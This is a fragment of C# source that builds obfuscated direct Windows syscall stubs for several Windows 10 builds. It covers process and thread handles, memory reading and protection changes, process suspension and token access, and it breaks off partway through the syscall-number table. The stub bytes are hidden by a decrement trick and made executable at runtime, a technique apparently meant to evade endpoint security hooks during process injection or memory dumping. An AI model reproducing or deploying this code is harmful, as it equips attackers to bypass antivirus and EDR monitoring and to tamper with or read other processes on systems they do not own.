public static NTSTATUS ZwOpenProcessToken(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle, ref OSVERSIONINFOEXW osVersionInfo)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 14, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwOpenProcessTokenX ZwOpenProcessTokenFunc = (ZwOpenProcessTokenX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessTokenX));
						return (NTSTATUS)ZwOpenProcessTokenFunc(ProcessHandle, DesiredAccess, ref TokenHandle);
				}
		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwWaitForSingleObjectX( IntPtr Object, bool Alertable, uint Timeout );
public static NTSTATUS ZwWaitForSingleObject( IntPtr Object, bool Alertable, uint Timeout, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 9, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwWaitForSingleObjectX ZwWaitForSingleObjectFunc = (ZwWaitForSingleObjectX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWaitForSingleObjectX));
						return (NTSTATUS)ZwWaitForSingleObjectFunc(Object, Alertable, Timeout);
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwUnmapViewOfSectionX( IntPtr hProc, IntPtr baseAddr );
public static NTSTATUS ZwUnmapViewOfSection( IntPtr hProc, IntPtr baseAddr, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 18, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
						ZwUnmapViewOfSectionX ZwUnmapViewOfSectionFunc = (ZwUnmapViewOfSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwUnmapViewOfSectionX));
						return (NTSTATUS)ZwUnmapViewOfSectionFunc( hProc, baseAddr);
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwGetNextProcessX( IntPtr ProcessHandle, ACCESS_MASK DesiredAccess, HandleFlags HandleAttributes, ulong Flags, out IntPtr NewProcessHandle );
public static NTSTATUS ZwGetNextProcess( IntPtr ProcessHandle, ACCESS_MASK DesiredAccess, HandleFlags HandleAttributes, ulong Flags, out IntPtr NewProcessHandle, ref OSVERSIONINFOEXW osVersionInfo)
{
	byte [] syscall = GetOSVersionAndReturnSyscall( 21, ref osVersionInfo );
	unsafe
	{
			fixed (byte* ptr = syscall)
			{
					IntPtr allocMemAddress = (IntPtr)ptr;
					IntPtr allocMemAddressCopy = (IntPtr)ptr;
					UInt32 size = (uint)syscall.Length;
					IntPtr sizeIntPtr = (IntPtr)size;
					UInt32 oldprotect = 0;
					NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect, ref osVersionInfo);
					ZwGetNextProcessX ZwGetNextProcessFunc = (ZwGetNextProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwGetNextProcessX));
					return (NTSTATUS)ZwGetNextProcessFunc( ProcessHandle, DesiredAccess, HandleAttributes, Flags, out NewProcessHandle );
			}
	}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwQuerySystemInformationX( SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, ulong SystemInformationLength, ref IntPtr ReturnLength );
public static NTSTATUS ZwQuerySystemInformation( SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, ulong SystemInformationLength, ref IntPtr ReturnLength, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 22, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwQuerySystemInformationX ZwQuerySystemInformationXFunc = (ZwQuerySystemInformationX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwQuerySystemInformationX));
						return (NTSTATUS)ZwQuerySystemInformationXFunc( SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength );
				}

		}
}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwQueryInformationProcessX( IntPtr ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, out PROCESS_BASIC_INFORMATION PBI, int ProcessInformationLength, out int ReturnLength );
public static NTSTATUS ZwQueryInformationProcess( IntPtr ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, out PROCESS_BASIC_INFORMATION PBI, int ProcessInformationLength, out int ReturnLength, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 28, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwQueryInformationProcessX ZwQueryInformationProcessXFunc = (ZwQueryInformationProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwQueryInformationProcessX));
						return (NTSTATUS)ZwQueryInformationProcessXFunc( ProcessHandle, ProcessInformationClass, out PBI, ProcessInformationLength, out ReturnLength  );
				}

		}
}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwReadVirtualMemoryX(  IntPtr ProcessHandle, IntPtr BaseAddress, out IntPtr Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead );
public static NTSTATUS ZwReadVirtualMemory( IntPtr ProcessHandle, IntPtr BaseAddress, out IntPtr Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 29, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwReadVirtualMemoryX ZwReadVirtualMemoryXFunc = (ZwReadVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwReadVirtualMemoryX));
						return (NTSTATUS)ZwReadVirtualMemoryXFunc(  ProcessHandle, BaseAddress, out Buffer, NumberOfBytesToRead, ref NumberOfBytesRead);
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwReadVirtualMemoryAX(  IntPtr ProcessHandle, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr NumberOfBytesToRead, IntPtr NumberOfBytesRead );
public static NTSTATUS ZwReadVirtualMemoryA( IntPtr ProcessHandle, IntPtr BaseAddress, out UNICODE_STRING Buffer, IntPtr NumberOfBytesToRead, IntPtr NumberOfBytesRead, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 29, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwReadVirtualMemoryAX ZwReadVirtualMemoryAXFunc = (ZwReadVirtualMemoryAX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwReadVirtualMemoryAX));
						return (NTSTATUS)ZwReadVirtualMemoryAXFunc( ProcessHandle, BaseAddress, out Buffer, NumberOfBytesToRead, NumberOfBytesRead );
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwReadVirtualMemoryBX( IntPtr ProcessHandle, IntPtr Buffer, [MarshalAs(UnmanagedType.LPWStr)] string buf, IntPtr NumberOfBytesToRead, IntPtr NumberOfBytesRead );
public static NTSTATUS ZwReadVirtualMemoryB( IntPtr ProcessHandle, IntPtr Buffer, [MarshalAs(UnmanagedType.LPWStr)] string buf, IntPtr NumberOfBytesToRead, IntPtr NumberOfBytesRead, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 29, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwReadVirtualMemoryBX ZwReadVirtualMemoryBXFunc = (ZwReadVirtualMemoryBX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwReadVirtualMemoryBX));
						return (NTSTATUS)ZwReadVirtualMemoryBXFunc( ProcessHandle, Buffer, buf, NumberOfBytesToRead, NumberOfBytesRead );
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwSuspendProcessX( IntPtr ProcessHandle );
public static NTSTATUS ZwSuspendProcess( IntPtr ProcessHandle, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 24, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwSuspendProcessX ZwSuspendProcessXFunc = (ZwSuspendProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwSuspendProcessX));
						return (NTSTATUS)ZwSuspendProcessXFunc( ProcessHandle );
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwResumeProcessX( IntPtr ProcessHandle );
public static NTSTATUS ZwResumeProcess( IntPtr ProcessHandle, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 25, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwResumeProcessX ZwResumeProcessXFunc = (ZwResumeProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeProcessX));
						return (NTSTATUS)ZwResumeProcessXFunc( ProcessHandle );
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwAlertResumeThreadX( IntPtr ProcessHandle, out UInt32 SuspendCount );
public static NTSTATUS ZwAlertResumeThread( IntPtr ProcessHandle, out UInt32 SuspendCount, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 26, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo );
						ZwAlertResumeThreadX ZwAlertResumeThreadFunc = (ZwAlertResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAlertResumeThreadX));
						return (NTSTATUS)ZwAlertResumeThreadFunc(ProcessHandle, out SuspendCount);
				}

		}
}


public static byte [] GetOSVersionAndReturnSyscall(byte sysType, ref OSVERSIONINFOEXW osVersionInfo)
{
		var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
		// Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004, 20H2
		if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19042)) // 20H2
			 {
							// ZwOpenProcess
							if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateThreadEx
							if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwWriteVirtualMemory
							if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwAllocateVirtualMemory
							if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateSection
							if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwMapViewOfSection
							if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateProcess
							if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwOpenThread
							if (sysType == 8) {	for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);	Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwResumeThread
							if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwWaitForSingleObject
							if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwSetContextThread
							if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x18B); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwGetContextThread
							if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwClose
							if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwOpenProcessToken
							if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwSuspendThread
							if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1BC); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwProtectVirtualMemory
							if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateProcessEx
							if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// NtCreateSection
							if (sysType == 18) { syscall[4] = 75; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// NtMapViewOfSection
							if (sysType == 19) { syscall[4] = 41; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// RtlCreateUserThread
							if (sysType == 20) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwGetNextProcess
							if (sysType == 21) { syscall[4] = 248; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwQuerySystemInformation
							if (sysType == 22) { syscall[4] = 55; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwTerminateProcess
							if (sysType == 23) { syscall[4] = 45; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwSuspendProcess
							if (sysType == 24) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1bb); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwResumeProcess
							if (sysType == 25) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x17b); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwAlertResumeThread
							if (sysType == 26) { syscall[4] = 111; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwAllocateVirtualMemoryEx
							if (sysType == 27) { syscall[4] = 119; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwQueryInformationProcess
							if (sysType == 28) { syscall[4] = 26; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwReadVirtualMemory
							if (sysType == 29) { syscall[4] = 64; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
		} else
		if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
			 {
							// ZwOpenProcess
							if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateThreadEx
							if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwWriteVirtualMemory
							if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwAllocateVirtualMemory
							if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateSection
							if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwMapViewOfSection
							if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateProcess
							if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwOpenThread
							if (sysType == 8) {	for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);	Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwResumeThread
							if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwWaitForSingleObject
							if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwSetContextThread
							if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x18B); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwGetContextThread
							if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwClose
							if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwOpenProcessToken
							if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwSuspendThread
							if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1BC); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwProtectVirtualMemory
							if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwCreateProcessEx
							if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// NtCreateSection
							if (sysType == 18) { syscall[4] = 75; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// NtMapViewOfSection
							if (sysType == 19) { syscall[4] = 41; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// RtlCreateUserThread
							if (sysType == 20) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwGetNextProcess
							if (sysType == 21) { syscall[4] = 248; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwQuerySystemInformation
							if (sysType == 22) { syscall[4] = 55; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwTerminateProcess
							if (sysType == 23) { syscall[4] = 45; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwSuspendProcess
							if (sysType == 24) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1bb); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwResumeProcess
							if (sysType == 25) { syscall[4] = 1; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x17b); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
							// ZwAlertResumeThread
							if (sysType == 26) { syscall[4] = 111; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwAllocateVirtualMemoryEx
							if (sysType == 27) { syscall[4] = 119; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwQueryInformationProcess
							if (sysType == 28) { syscall[4] = 26; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
							// ZwReadVirtualMemory
							if (sysType == 29) { syscall[4] = 64; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
				} else

							if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
							{
								// NtOpenProcess
								if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// NtCreateThreadEx
								if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwWriteVirtualMemory
								if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// NtAllocateVirtualMemory
								if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwCreateSection
								if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwMapViewOfSection
								if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwCreateProcess
								if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwOpenThread
								if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
								// ZwResumeThread
								if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwWaitForSingleObject
								if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwSetContextThread
								if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
								// ZwGetContextThread
								if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwClose
								if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwOpenProcessToken
								if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x123); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
								// ZwSuspendThread
								if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
								// ZwProtectVirtualMemory
								if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwCreateProcessEx
								if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// NtCreateSection
								if (sysType == 18) { syscall[4] = 75; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// NtMapViewOfSection
								if (sysType == 19) { syscall[4] = 41; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwGetNextProcess
								if (sysType == 21) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
								// ZwQuerySystemInformation
								if (sysType == 22) { syscall[4] = 55; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
					} else

								if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
								{
											// ZwOpenProcess
											if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateThreadEx
											if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwWriteVirtualMemory
											if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwAllocateVirtualMemory
											if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateSection
											if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwMapViewOfSection
											if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateProcess
											if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwOpenThread
